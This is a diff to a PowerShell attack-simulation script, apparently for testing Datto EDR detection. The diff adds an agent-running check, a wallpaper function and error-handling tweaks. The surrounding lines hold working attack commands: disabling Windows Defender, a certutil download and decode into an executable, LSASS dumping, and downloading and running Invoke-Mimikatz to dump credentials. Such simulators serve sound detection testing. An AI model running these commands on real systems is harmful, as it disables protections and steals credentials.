@@ -6,12 +6,26 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Sleep 10
     return
 }
+$agent = Get-Service -Name HUNTAgent2
+if (-NOT $agent) {
+    Write-Warning "[Error] Datto EDR Agent is not installed!`nExiting..."
+    return
+}
+If ($agent.status -ne "Running") {
+    Write-Warning "[Error] Datto EDR Agent is NOT running!`nAttempting to enable..."
+    $agent.Start
+    Start-Sleep 1
+    If ($agent.status -ne "Running") {
+        Write-Warning "[Error] Datto EDR Agent could not be restarted!`nExiting..."
+        return
+    }
+}
 
 #Define some randomness
 $n = 1000+$(Get-Random -Max 999)
 
 Write-Host "Starting Datto Attack Simulator"
-New-Item -Path "$env:TEMP" -Name "AttackSim" -ItemType "directory" -ea 0
+New-Item -Path "$env:TEMP" -Name "AttackSim" -ItemType "directory" -ErrorAction Ignore
 $attackDir = "$env:TEMP\AttackSim"
 
 
@@ -67,7 +81,7 @@ Start-Sleep -m $n
 "@
 Powershell.exe -Win N -exec bypass -nop -command $cmd
 Start-Sleep 3
-Remove-item $attackDir\recon.txt -ea 0 -force
+Remove-item $attackDir\recon.txt -ErrorAction Ignore -force
 
 
 Start-Sleep 10
@@ -79,8 +93,8 @@ Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
 $cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -m $n"
 powershell.exe -Win N -exec bypass -nop -command $cmd
-sc config WinDefend start= disabled
-sc stop WinDefend
+sc config WinDefend start= disabled >nul 2>&1
+sc stop WinDefend >nul 2>&1
 
 
 Write-Host "Creating binary with double extension"
@@ -88,8 +102,8 @@ Copy-Item -Path C:\Windows\System32\calc.exe -Destination "$attackDir\AttackSim$
 Write-Host "Initiating double-extension binary execution"
 Start-Process -FilePath "$attackDir\AttackSim$($n).pdf.exe"
 Start-Sleep 2
-Stop-Process -Name AttackSim*
-Remove-Item "$attackDir\AttackSim$($n).pdf.exe"
+Stop-Process -Name AttackSim* -Force -ErrorAction Ignore
+Remove-Item "$attackDir\AttackSim$($n).pdf.exe" -Force -ErrorAction Ignore
 
 
 Write-Host "Initiating Defense Evasion - T1027 - Obfuscated Files or Information"
@@ -98,7 +112,7 @@ Write-Host "Certutil Download and Decode"
 certutil -urlcache -split -f "http://www.brainjar.com/java/host/test$($n).html" test.txt 
 certutil -decode -f test.txt "WindowsUpdate$($n).exe"
 Start-Sleep 10
-Remove-Item test.txt -Force -ea 0
+Remove-Item test.txt -Force -ErrorAction Ignore
 
 
 
@@ -142,7 +156,7 @@ $Create.Save()
 $cmd += "`nStart-Sleep -m $n"
 powershell.exe -Win N -exec bypass -nop -command $cmd
 Start-Sleep 2
-#Remove-Item "$attackDir\EICAR.exe" -Force
+#Remove-Item "$attackDir\EICAR.exe" -Force -ErrorAction Ignore
 #Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk" -ErrorAction Ignore
 #Remove-Item "$home\Desktop\evil_calc.lnk" -ErrorAction Ignore
 
@@ -183,7 +197,7 @@ Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and toke
 
 Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
 Start-Sleep 2
-Remove-Item "$attackDir\lsass.dmp"
+Remove-Item "$attackDir\lsass.dmp" -Force -ErrorAction Ignore
 
 # Mimikatz
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds; Start-Sleep -m $n"
@@ -262,4 +276,58 @@ sc config WinDefend start= Auto
 sc start WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $false
 
-#Remove-Item -Path $attackDir -Recurse -force -ea 0
+#Remove-Item -Path $attackDir -Recurse -force -ErrorAction Ignore
+
+
+Function Set-WallPaper {    
+    param (
+        [parameter(Mandatory=$True)]
+        # Provide path to image
+        [string]$Image,
+        # Provide wallpaper style that you would like applied
+        [parameter(Mandatory=$False)]
+        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
+        [string]$Style
+    )
+     
+    $WallpaperStyle = Switch ($Style) {
+        "Fill" {"10"}
+        "Fit" {"6"}
+        "Stretch" {"2"}
+        "Tile" {"0"}
+        "Center" {"0"}
+        "Span" {"22"}
+    }
+    If($Style -eq "Tile") {
+        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
+    }
+    Else {
+        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
+    }
+     
+    Add-Type -TypeDefinition @" 
+    using System; 
+    using System.Runtime.InteropServices;
+      
+    public class Params
+    { 
+        [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
+        public static extern int SystemParametersInfo (Int32 uAction, 
+                                                       Int32 uParam, 
+                                                       String lpvParam, 
+                                                       Int32 fuWinIni);
+    }
+    "@ 
+      
+        $SPI_SETDESKWALLPAPER = 0x0014
+        $UpdateIniFile = 0x01
+        $SendChangeEvent = 0x02
+      
+        $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+      
+        $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+    }
+     
+Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
